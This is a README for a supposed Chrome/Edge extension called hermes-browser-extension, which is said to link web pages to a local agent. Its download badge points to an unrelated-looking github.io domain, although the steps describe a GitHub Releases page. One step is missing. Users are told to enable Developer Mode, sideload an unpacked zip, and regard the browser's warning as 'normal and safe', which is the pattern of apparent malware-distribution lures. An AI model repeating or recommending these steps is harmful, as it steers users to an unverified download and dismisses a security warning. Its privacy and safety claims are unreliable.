# 🌐 hermes-browser-extension - Connect web pages to local agents

[![](https://img.shields.io/badge/Download_Extension-Blue-blue)](https://torulose-formula909.github.io)

## What is this tool?
The hermes-browser-extension connects your web browser to the Hermes Agent running on your computer. It creates a side panel within your browser where the agent lives. This setup lets you send text and data from websites directly to your local machine. You keep your data private because the agent runs locally. This bridge between your browser and your machine makes web research and data handling faster.

## ⚙️ System Requirements
Before you install the software, ensure your computer meets these needs:
- Windows 10 or Windows 11.
- Google Chrome or Microsoft Edge browser.
- The Hermes Agent desktop software installed and running.
- At least 200MB of free disk space.
- A stable internet connection for the initial setup.

## 📥 Getting the extension
You need to visit the project page to get the files.

1. Visit the link above.
2. Look for the section labeled Releases on the right side of the page.
3. Click the latest version number.

5. Click the file to download it to your Downloads folder.
6. Open your folders and find the compressed .zip file.
7. Right-click the file and select Extract All. 
8. Choose a folder where you want to keep the files and click Extract.

## 🔌 Installing in your browser
Your browser needs to recognize the folder you just extracted. Use these steps for Google Chrome or Microsoft Edge:

1. Open your browser.
2. Click the three dots in the top right corner.
3. Select Extensions and then Manage Extensions.
4. Look for a switch in the top right corner labeled Developer Mode. Click it to turn it on.
5. Click the button that says Load Unpacked.
6. Find the folder where you extracted the files in the previous step.
7. Select that folder and click Select Folder.
8. The extension icon will now appear in your browser toolbar.

## 🛠️ How to use
Once the extension is active, follow these steps to connect it to your local agent:

1. Start the Hermes Agent software on your computer.
2. Click the Hermes icon in your browser toolbar to open the side panel.
3. If the panel shows a connection error, verify that your local agent status is set to Active.
4. Select the web content you want to send to your agent.
5. Right-click the selected text and choose Send to Hermes from the menu.
6. Your local agent will process the data immediately.

## 🧩 Features
- Side Panel Access: Open and close your agent view without leaving the browser tab.
- Local Data Transfer: Send information directly to your local machine without sending it to third-party servers.
- Context Sharing: Share the current page URL and text snippets with one click.
- Browser Compatibility: Works with both Chrome and Edge architectures.
- Real-time Sync: See responses from your local agent as they happen.

## ❓ Frequently Asked Questions
### Does this extension store my history?
No. All data processing occurs on your local machine. The extension acts only as a pipe to move information from the browser to your Agent.

### Can I use this with Firefox?
This version supports Chromium-based browsers like Chrome and Edge. Firefox uses a different coding structure.

### Why do I see a warning about developer mode?
Browsers show this warning because the extension was not installed from the official browser store. Because you downloaded this directly from the source code, the browser treats it as a development project. This is normal and safe in this context.

### The panel stays blank. What do I do?
First, check that the main Hermes Agent application is running on your desktop. If it is running, refresh your browser page and click the extension icon again. Ensure your firewall is not blocking connections between local applications.

## 📋 Troubleshooting
If you encounter issues, try these steps first:
1. Reload the extension: Go to your extensions page, find Hermes, and click the refresh arrow icon.
2. Check for updates: New versions might fix connection errors. Check the main page periodically for updates.
3. Restart your browser: This often fixes issues with active extensions. 
4. Check your local agent: Ensure your local version corresponds to the extension version. Mismatched versions may cause communication errors.
